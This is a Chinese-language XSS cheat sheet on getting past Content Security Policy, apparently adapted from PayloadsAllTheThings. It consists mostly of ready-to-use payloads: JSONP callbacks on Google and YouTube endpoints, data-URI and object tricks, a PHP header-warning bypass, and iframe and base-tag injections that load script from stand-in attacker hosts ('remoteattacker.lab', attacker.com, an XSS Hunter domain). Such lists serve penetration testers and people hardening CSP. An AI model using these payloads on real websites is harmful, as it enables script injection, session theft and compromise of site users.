# XSS CSP Bypass - XSS内容安全策略绕过

[SEARCH_KEYWORDS]
漏洞类型: XSS CSP Bypass Content Security Policy 内容安全策略绕过
攻击类型: Cross-Site Scripting Policy Bypass Filter Evasion
关键词: CSP Content-Security-Policy script-src default-src nonce unsafe-inline JSONP
技术: JSONP Bypass Base Tag Dangling Markup iframe Injection Data URI
工具: gmsgadget.com csp-evaluator.withgoogle.com

[CONTENT]

## CSP绕过概述

内容安全策略(CSP)是一种安全功能，帮助防止XSS、数据注入攻击和其他代码注入漏洞。它通过指定允许加载和执行的内容来源来工作。但CSP往往存在配置缺陷可被绕过。

## 绕过工具

- [gmsgadget.com](https://gmsgadget.com/) - GMSGadget JavaScript gadgets集合，用于绕过CSP
- [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) - Google CSP评估工具

## JSONP绕过

**要求**: CSP包含白名单域名如`script-src 'self' https://www.google.com`

**Payload**:

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

**可用JSONP端点**:
- Google Search: `//google.com/complete/search?client=chrome&jsonp=alert(1);`
- Google Account: `https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)`
- Google Translate: `https://translate.googleapis.com/$discovery/rest?version=v3&callback=alert();`
- Youtube: `https://www.youtube.com/oembed?callback=alert;`

## default-src绕过

**要求**: CSP `Content-Security-Policy: default-src 'self' 'unsafe-inline';`

**Payload**:

```js
f=document.createElement("iframe");f.id="pwn";f.src="/robots.txt";f.onload=()=>{x=document.createElement('script');x.src='//remoteattacker.lab/csp.js';pwn.contentWindow.document.body.appendChild(x)};document.body.appendChild(f);
```

## inline eval绕过

**要求**: CSP包含`inline`或`eval`

**Payload**:

```js
d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

## script-src self绕过

**要求**: CSP `script-src self`

**Payload**:

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

## script-src data绕过

**要求**: CSP `script-src 'self' data:`

**Payload**:

```javascript
<script src="data:,alert(1)">/</script>
```

## unsafe-inline绕过

**要求**: CSP `script-src https://google.com 'unsafe-inline';`

**Payload**:

```javascript
"/><script>alert(1);</script>
```

## Nonce绕过

**要求**:
- CSP `script-src 'nonce-RANDOM_NONCE'`
- 存在相对路径JS引用: `<script src='/PATH.js'></script>`

**Payload**:

```html
<base href=http://www.attacker.com>
```

然后在攻击者服务器相同路径托管恶意JS: `http://www.attacker.com/PATH.js`

## PHP CSP绕过

**要求**: CSP由PHP `header()`函数发送

**原理**: 在默认`php:apache`配置中，当响应数据已写入时PHP无法修改headers。可通过生成警告绕过：

- 1000个$_GET参数
- 1000个$_POST参数
- 20个$_FILES

**Payload**:

```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
```

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/4 - CSP Bypass.md